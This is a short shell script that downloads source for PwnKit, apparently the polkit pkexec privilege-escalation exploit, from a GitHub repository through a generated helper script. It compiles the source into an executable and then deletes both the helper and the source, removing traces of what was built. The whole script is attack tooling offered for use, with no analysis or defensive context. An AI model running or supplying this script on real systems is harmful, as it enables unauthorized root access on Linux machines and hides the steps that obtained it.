echo "Creating SH File..."
#start create SH File
printf "curl -fsSL https://raw.githubusercontent.com/CCR-ice/pwnkit/main/PwnKit.c -o PwnKit.c\n" > start.sh
#end create SH File
sleep 5
#start script permission
chmod +x ./start.sh
#end script permission
sleep 5
echo "Fetching C source..."
#start shell script
./start.sh
#end shell script
sleep 11
echo "Done."
echo "Creating ecxecutable..."
#start compile
gcc -o PwnKit PwnKit.c
#end compile
sleep 5
echo "Done."
echo "Cleaning up..."
#start cleanup
echo "Removing \"start.sh\"..."
rm -rf start.sh
sleep 5
echo "Done."
echo "Removing \"PwnKit.c\"..."
rm -rf PwnKit.c
#end cleanup
sleep 5
echo "Done."
